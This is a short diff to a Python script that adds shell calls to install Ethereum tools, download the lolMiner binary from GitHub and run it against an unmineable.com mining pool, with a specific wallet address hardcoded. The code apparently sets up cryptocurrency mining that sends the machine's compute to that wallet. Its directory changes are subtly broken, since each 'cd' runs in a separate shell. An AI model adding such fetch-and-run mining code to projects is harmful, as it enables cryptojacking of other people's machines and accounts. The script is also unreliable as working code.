@@ -1,2 +1,10 @@
 import os
 os.system('add-apt-repository ppa:ethereum/ethereum')
+os.system('apt update')
+os.system('apt install ethereum')
+os.system('wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.37/lolMiner_v1.37.tar.gz')
+os.system('mkdir lolminer')
+os.system('cd lolminer')
+os.system('tar -xzvf ../lolMiner_v1.37.tar.gz')
+os.system('cd 1.37')
+os.system('./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user ELON:0x6822fc02F5BC029D253458052a9de1303C4eC834.Awqnerd --ethstratum ETHPROXY pause')
